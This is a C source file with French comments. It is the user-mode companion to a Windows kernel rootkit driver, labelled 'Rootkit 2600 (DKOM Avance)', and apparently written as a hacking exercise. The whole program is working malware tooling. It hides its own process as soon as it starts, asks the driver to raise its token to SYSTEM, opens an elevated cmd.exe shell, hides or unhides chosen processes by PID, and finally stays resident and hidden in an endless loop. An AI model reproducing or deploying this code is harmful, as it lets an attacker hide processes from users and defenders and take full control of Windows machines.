// companion.c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <string.h>
#include <processthreadsapi.h> 
#include <psapi.h> 
#pragma comment(lib, "Psapi.lib")

#define IOCTL_ROOTKIT_GENERIC_COMMAND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define MAX_HIDDEN_PIDS_TO_DISPLAY 64 

typedef enum _ROOTKIT_COMMAND_TYPE
{
    RootkitCommandElevateProcess,
    RootkitCommandHideProcess,
    RootkitCommandUnhideProcess,
    RootkitCommandGetHiddenProcesses
} ROOTKIT_COMMAND_TYPE;

typedef struct _ROOTKIT_COMMAND_MESSAGE
{
    ROOTKIT_COMMAND_TYPE CommandType;
    HANDLE ProcessId; 
} ROOTKIT_COMMAND_MESSAGE, *PROOTKIT_COMMAND_MESSAGE;

#define OUTPUT_BUFFER_SIZE 512 // Pour RunCommandAndGetOutput

// Fonction pour exécuter une commande et capturer sa sortie
BOOL RunCommandAndGetOutput(const char* command, char* outputBuffer, DWORD outputBufferSize)
{
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;
    SECURITY_ATTRIBUTES sa;
    BOOL bSuccess = FALSE;
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFOA siStartInfo;
    DWORD dwRead;
    char cmdLine[MAX_PATH];

    outputBuffer[0] = '\0';
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &sa, 0))
    {
        printf("Erreur CreatePipe: %lu\n", GetLastError());
        return FALSE;
    }

    if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        printf("Erreur SetHandleInformation: %lu\n", GetLastError());
        CloseHandle(hChildStd_OUT_Rd);
        CloseHandle(hChildStd_OUT_Wr);
        return FALSE;
    }

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOA));
    siStartInfo.cb = sizeof(STARTUPINFOA);
    siStartInfo.hStdError = hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
    snprintf(cmdLine, MAX_PATH, "cmd.exe /C %s", command);

    bSuccess = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo);
    if (!bSuccess)
    {
        printf("Erreur CreateProcess pour '%s': %lu\n", command, GetLastError());
        CloseHandle(hChildStd_OUT_Rd);
        CloseHandle(hChildStd_OUT_Wr);
        return FALSE;
    }

    CloseHandle(hChildStd_OUT_Wr);
    hChildStd_OUT_Wr = NULL;
    DWORD totalBytesRead = 0;

    while (ReadFile(hChildStd_OUT_Rd, outputBuffer + totalBytesRead, outputBufferSize - totalBytesRead - 1, &dwRead, NULL) && dwRead > 0)
    {
        totalBytesRead += dwRead;
        if (totalBytesRead >= outputBufferSize - 1)
        {
            break;
        }
    }
    outputBuffer[totalBytesRead] = '\0';
    CloseHandle(hChildStd_OUT_Rd);
    WaitForSingleObject(piProcInfo.hProcess, INFINITE);
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    return TRUE;
}

// Fonction pour envoyer une commande structurée au pilote et recevoir une sortie optionnelle
BOOL SendStructuredCommandWithOutput(HANDLE hDevice, PROOTKIT_COMMAND_MESSAGE commandMessage, PVOID outputBuffer, DWORD outputBufferSize, PDWORD pBytesReturned)
{
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_ROOTKIT_GENERIC_COMMAND,
        commandMessage,                
        sizeof(ROOTKIT_COMMAND_MESSAGE),
        outputBuffer,                  
        outputBuffer ? outputBufferSize : 0, 
        pBytesReturned,
        NULL
    );
    return result; 
}

// Nouvelle fonction pour afficher les processus cachés
void AfficherProcessusCaches(HANDLE hDevice)
{
    ROOTKIT_COMMAND_MESSAGE commandMessage;
    HANDLE hiddenPidsBuffer[MAX_HIDDEN_PIDS_TO_DISPLAY];
    char processImagePath[MAX_PATH];
    DWORD bytesReturned;

    RtlZeroMemory(hiddenPidsBuffer, sizeof(hiddenPidsBuffer));
    commandMessage.CommandType = RootkitCommandGetHiddenProcesses;
    commandMessage.ProcessId = 0; 

    printf("Demande de la liste des processus caches au pilote...\n");
    if (SendStructuredCommandWithOutput(hDevice, &commandMessage, hiddenPidsBuffer, sizeof(hiddenPidsBuffer), &bytesReturned))
    {
        if (bytesReturned > 0 && (bytesReturned % sizeof(HANDLE) == 0))
        {
            ULONG count = bytesReturned / sizeof(HANDLE);
            printf("Processus caches par le rootkit (max %d affiches) :\n", MAX_HIDDEN_PIDS_TO_DISPLAY);
            if (count == 0)
            {
                printf("  Aucun processus actuellement enregistre comme cache par le pilote.\n");
            }
            for (ULONG i = 0; i < count; i++)
            {
                DWORD pid = (DWORD)(ULONG_PTR)hiddenPidsBuffer[i];
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
                if (hProcess != NULL)
                {
                    if (GetModuleFileNameExA(hProcess, NULL, processImagePath, MAX_PATH) == 0)
                    {
                        printf("  - PID: %lu (0x%p) - Nom: <erreur GetModuleFileNameExA: %lu>\n", pid, hiddenPidsBuffer[i], GetLastError());
                    }
                    else
                    {
                        char* processName = strrchr(processImagePath, '\\');
                        if (processName == NULL)
                        {
                            processName = processImagePath;
                        }
                        else
                        {
                            processName++;
                        }
                        printf("  - PID: %lu (0x%p) - Nom: %s\n", pid, hiddenPidsBuffer[i], processName);
                    }
                    CloseHandle(hProcess);
                }
                else
                {
                    printf("  - PID: %lu (0x%p) - Nom: <Impossible d'ouvrir (termine/protege? Erreur: %lu)>\n", pid, hiddenPidsBuffer[i], GetLastError());
                }
            }
        }
        else if (bytesReturned == 0)
        {
            printf("  Aucun processus actuellement enregistre comme cache par le pilote (ou buffer vide retourne).\n");
        }
        else
        {
            printf("  Le pilote a retourne une taille de donnees incoherente: %lu octets.\n", bytesReturned);
        }
    }
    else
    {
        printf("Echec de la recuperation de la liste des processus caches. Erreur DeviceIoControl: %lu\n", GetLastError());
    }
}


int main()
{
    HANDLE hDevice = CreateFileA("\\\\.\\MonDeviceLink", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    ROOTKIT_COMMAND_MESSAGE commandMessage; 
    DWORD bytesReturned;                 

    if (hDevice == INVALID_HANDLE_VALUE)
    { 
        printf("Impossible d'ouvrir le device \\\\.\\MonDeviceLink. Code: %lu\n", GetLastError()); 
        printf("Assurez-vous que le pilote est charge.\n");
        return 1; 
    }
    printf("Device \\\\.\\MonDeviceLink ouvert avec succes.\n");

    DWORD companionPid = GetCurrentProcessId();
    printf("Tentative de masquage immediat de ce programme (Compagnon, PID: %lu)...\n", companionPid);
    commandMessage.CommandType = RootkitCommandHideProcess;
    commandMessage.ProcessId = (HANDLE)(ULONG_PTR)companionPid;
    if (SendStructuredCommandWithOutput(hDevice, &commandMessage, NULL, 0, &bytesReturned))
    {
        printf("Demande de masquage envoyee au pilote pour PID %lu.\n", companionPid);
    }
    else
    { 
        printf("Echec de l'envoi de la commande de masquage immediat au pilote pour PID %lu. Erreur: %lu\n", companionPid, GetLastError()); 
    }
    
    printf("\n--- Etat Actuel des Processus Caches ---\n");
    AfficherProcessusCaches(hDevice);
    printf("----------------------------------------\n");

    int choice;
    char repeat = 'y';
    char outputWhoami[OUTPUT_BUFFER_SIZE];
    char inputBufferUtil[30]; 

    while (repeat == 'y' || repeat == 'Y')
    {
        printf("\n--- Menu Rootkit 2600 (DKOM Avance) ---\n");
        printf(" (Ce programme compagnon est cense etre cache)\n");
        printf("1. Elevation de privilege du processus compagnon\n");
        printf("2. Cacher un autre processus (via PID)\n");
        printf("3. Rendre visible un processus (via PID)\n");
        printf("4. Lister les processus caches (avec noms) (Rafraichir)\n");
        printf(">> ");

        if (scanf("%d", &choice) != 1)
        {
            printf("Entree invalide.\n");
            while (getchar() != '\n' && getchar() != EOF);
            continue;
        }
        fgets(inputBufferUtil, sizeof(inputBufferUtil), stdin); 

        switch (choice)
        {
            case 1:
            { 
                printf("\n--- Whoami AVANT elevation ---\n");
                if (RunCommandAndGetOutput("whoami", outputWhoami, sizeof(outputWhoami)))
                {
                    printf("%s", outputWhoami);
                }
                else
                {
                    printf("Erreur execution whoami avant.\n");
                }
                commandMessage.CommandType = RootkitCommandElevateProcess;
                commandMessage.ProcessId = 0; 
                printf("\nEnvoi de la commande d'elevation au pilote...\n"); 
                if(SendStructuredCommandWithOutput(hDevice, &commandMessage, NULL, 0, &bytesReturned))
                {
                    printf("Commande d'elevation envoyee.\n");
                } 
                else
                {
                    printf("Echec de l'envoi de la commande d'elevation. Erreur: %lu\n", GetLastError());
                }
                printf("\n--- Whoami APRES tentative d'elevation ---\n");
                if (RunCommandAndGetOutput("whoami", outputWhoami, sizeof(outputWhoami)))
                {
                    printf("%s", outputWhoami);
                    if (strstr(outputWhoami, "system") || strstr(outputWhoami, "SYSTEM") || strstr(outputWhoami, "autorite"))
                    {
                        printf(">>> Elevation REUSSIE! <<<\n");
                    }
                    else
                    {
                        printf(">>> Elevation ECHOUE. Verifiez le pilote.\n");
                    }
                }
                else
                {
                    printf("Erreur execution whoami apres.\n");
                }
                
                printf("\nLancement d'un shell local (cmd.exe)...\n");
                PROCESS_INFORMATION piCmd;
                STARTUPINFOA siCmd;
                ZeroMemory(&siCmd, sizeof(STARTUPINFOA));
                siCmd.cb = sizeof(STARTUPINFOA);
                if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&siCmd,&piCmd))
                {
                    printf("Shell cmd.exe lance (PID: %lu). Fermez-le pour continuer.\n", piCmd.dwProcessId);
                    WaitForSingleObject(piCmd.hProcess, INFINITE);
                    printf("Shell cmd.exe termine.\n");
                    CloseHandle(piCmd.hProcess);
                    CloseHandle(piCmd.hThread);
                }
                else
                {
                    printf("Erreur CreateProcess pour cmd.exe: %lu\n", GetLastError());
                }
                break;
            }
            case 2:
            { 
                DWORD pidToHide;
                printf("Entrez le PID du processus a cacher: ");
                if (scanf("%lu", &pidToHide) == 1)
                {
                    fgets(inputBufferUtil, sizeof(inputBufferUtil), stdin); 
                    commandMessage.CommandType = RootkitCommandHideProcess;
                    commandMessage.ProcessId = (HANDLE)(ULONG_PTR)pidToHide; 
                    printf("Envoi de la commande de masquage pour PID %lu au pilote...\n", pidToHide);
                    if(!SendStructuredCommandWithOutput(hDevice, &commandMessage, NULL, 0, &bytesReturned))
                    {
                        printf("Echec de l'envoi de la commande de masquage. Erreur: %lu\n", GetLastError());
                    }
                }
                else
                {
                    printf("PID invalide.\n");
                    while (getchar() != '\n' && getchar() != EOF);
                }
                break;
            }
            case 3:
            { 
                DWORD pidToUnhide;
                printf("Entrez le PID du processus a rendre visible: ");
                if (scanf("%lu", &pidToUnhide) == 1)
                {
                    fgets(inputBufferUtil, sizeof(inputBufferUtil), stdin); 
                    commandMessage.CommandType = RootkitCommandUnhideProcess;
                    commandMessage.ProcessId = (HANDLE)(ULONG_PTR)pidToUnhide; 
                    printf("Envoi de la commande pour rendre visible le PID %lu au pilote...\n", pidToUnhide);
                     if(!SendStructuredCommandWithOutput(hDevice, &commandMessage, NULL, 0, &bytesReturned))
                     {
                        printf("Echec de l'envoi de la commande. Erreur: %lu\n", GetLastError());
                     }
                }
                else
                {
                    printf("PID invalide.\n");
                    while (getchar() != '\n' && getchar() != EOF);
                }
                break;
            }
            case 4:
            { 
                AfficherProcessusCaches(hDevice);
                break;
            }
            default:
                printf("Option invalide\n");
        }
        printf("\nSouhaitez-vous effectuer une autre operation ? (y/n) ");
        if (scanf(" %c", &repeat) != 1)
        {
            repeat = 'n';
        }
        fgets(inputBufferUtil, sizeof(inputBufferUtil), stdin); 
    }

    printf("Le compagnon va maintenant rester actif en arriere-plan (et cache).\n");
    printf("Pour le terminer, il faudra le tuer manuellement.\n");
    CloseHandle(hDevice); 
    
    while (TRUE)
    {
        Sleep(60000);
    }
    return 0; 
}